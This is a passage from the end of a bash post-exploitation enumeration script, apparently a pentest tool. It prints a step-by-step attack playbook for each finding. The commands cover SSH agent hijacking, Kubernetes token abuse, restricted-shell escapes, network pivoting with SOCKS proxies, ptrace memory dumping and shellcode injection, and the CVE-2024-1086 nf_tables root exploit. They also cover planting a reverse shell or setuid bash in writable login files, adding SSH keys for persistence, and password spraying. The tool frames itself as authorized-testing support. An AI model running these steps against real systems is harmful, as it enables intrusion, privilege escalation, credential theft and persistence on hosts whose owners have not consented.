    "         SSH_AUTH_SOCK=<sock> ssh <user>@<known-host>   # auth with the agent's key" \
    "targets: pull hosts from ~/.ssh/known_hosts and ~/.ssh/config above." \
    "confirm: a shell on another host without ever reading the private key"; fi

if pb_has K8S_TOKEN || pb_has KUBECONFIG; then step "Kubernetes creds -> cluster + workload pivot"
  [ -n "$(pb_vals K8S_TOKEN)" ]  && list_ K8S_TOKEN; [ -n "$(pb_vals KUBECONFIG)" ] && list_ KUBECONFIG
  step "  how" \
    "token  : T=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
    "         kubectl --token=\$T --server=https://<api>:6443 auth can-i --list" \
    "config : KUBECONFIG=<file> kubectl get pods -A   (then exec/priv pods, read secrets)" \
    "confirm: enumerate/exec across the cluster with the account's RBAC"; fi

if pb_has RESTRICTED_SHELL; then step "Restricted shell -> break out"; list_ RESTRICTED_SHELL
  step "  how (try in order, per GTFOBins for the allowed binaries)" \
    "editor : vi/vim ->  :set shell=/bin/bash  then  :shell     (less ->  !/bin/bash)" \
    "lang   : awk 'BEGIN{system(\"/bin/bash\")}'    find . -exec /bin/bash \\;    man->!/bin/bash" \
    "env    : export PATH=/bin:/usr/bin  ;  export SHELL=/bin/bash  ;  ssh with -t bash" \
    "confirm: an unrestricted prompt (type: echo \$-  -> no 'r')"; fi

if pb_has DUAL_HOMED; then step "Dual-homed host -> pivot into another segment"; list_ DUAL_HOMED
  step "  how" \
    "map    : ip -brief addr / ip route  -> note the second subnet." \
    "pivot  : ssh -D 1080 <this-host>  (SOCKS)  or  chisel/ligolo-ng  through this host," \
    "         then scan/reach the far segment via the proxy (proxychains)." \
    "confirm: you can reach hosts only routable from this box"; fi

if pb_has PTRACE_SCOPE; then step "ptrace_scope=0 -> steal creds from another process"; list_ PTRACE_SCOPE
  step "  how" \
    "run    : gdb -p <pid-of-a-privileged-or-target-process>  and read memory, or" \
    "         inject a shellcode/so via the standard ptrace technique (public PoCs)." \
    "creds  : dump a target's memory to scrape passwords/tokens it holds." \
    "confirm: recovered secret or code exec in the target's context"; fi

if pb_has NFTABLES; then step "nf_tables (CVE-2024-1086) -> root"; list_ NFTABLES
  step "  how" \
    "prereq : unprivileged user namespaces enabled (unprivileged_userns_clone=1)." \
    "run    : compile the public CVE-2024-1086 PoC offline; it UAFs nf_tables -> root." \
    "confirm: id -> uid=0(root)   (test in a VM - kernel LPEs can panic)"; fi

if pb_has WRITABLE_RC || pb_has WRITABLE_AUTHKEYS || pb_has PAM_WRITABLE; then
  step "Writable login hook -> escalation when a privileged user logs in / persistence"
  [ -n "$(pb_vals WRITABLE_RC)" ]       && list_ WRITABLE_RC
  [ -n "$(pb_vals WRITABLE_AUTHKEYS)" ] && list_ WRITABLE_AUTHKEYS
  [ -n "$(pb_vals PAM_WRITABLE)" ]      && list_ PAM_WRITABLE
  step "  how" \
    "rc     : if root (or an admin) sources the writable file at login, your line runs as them" \
    "         (e.g. a reverse shell / cp+chmod +s bash). Confirm WHO triggers it first." \
    "authkey: append your public key -> ssh back in as that user any time." \
    "confirm: code exec as the triggering user / silent re-entry"; fi

if pb_has SSH_KEY || pb_has KRB_TICKET || pb_has CLOUD_CREDS || pb_has SECRETS_FOUND || pb_has PROC_ENV || pb_has DB_CREDS || pb_has CRED_FILE; then
  step "Harvested credentials / keys / tickets -> reuse & pivot"
  [ -n "$(pb_vals SSH_KEY)" ]     && list_ SSH_KEY
  [ -n "$(pb_vals KRB_TICKET)" ]  && list_ KRB_TICKET
  [ -n "$(pb_vals CLOUD_CREDS)" ] && list_ CLOUD_CREDS
  [ -n "$(pb_vals CRED_FILE)" ]   && list_ CRED_FILE
  [ -n "$(pb_vals DB_CREDS)" ]    && list_ DB_CREDS
  step "  how" \
    "ssh    : ssh -i <id_rsa> <user>@<host>   (chmod 600 the key first)" \
    "kerb   : export KRB5CCNAME=<ccache>; klist; then impacket tools with -k -no-pass" \
    "cloud  : aws sts get-caller-identity  /  az account show  /  kubectl auth can-i --list" \
    "reuse  : spray any recovered password across the subnet - password reuse is common." \
    "confirm: authenticated access to a new account/host"; fi

_emit ""
_emit "  Every step above references an EXISTING public tool or technique - run it"
_emit "  yourself, only within your rules of engagement. Match each block to its [!]"
_emit "  line. Nothing here was executed for you."

_emit ""
_emit "${C_H}Done.${C_R} Review every ${C_F}[!]${C_R} line. Nothing was changed on this host."
}

# Run. With -o, tee the COMPLETE output (every section and every raw dump) to the
# report while still streaming it live; without -o, print straight to terminal.
if [ -n "$OUT" ]; then
  : >"$OUT"
  main | tee "$OUT"
  echo "Full report written to: $OUT"
else
  main
fi
exit 0
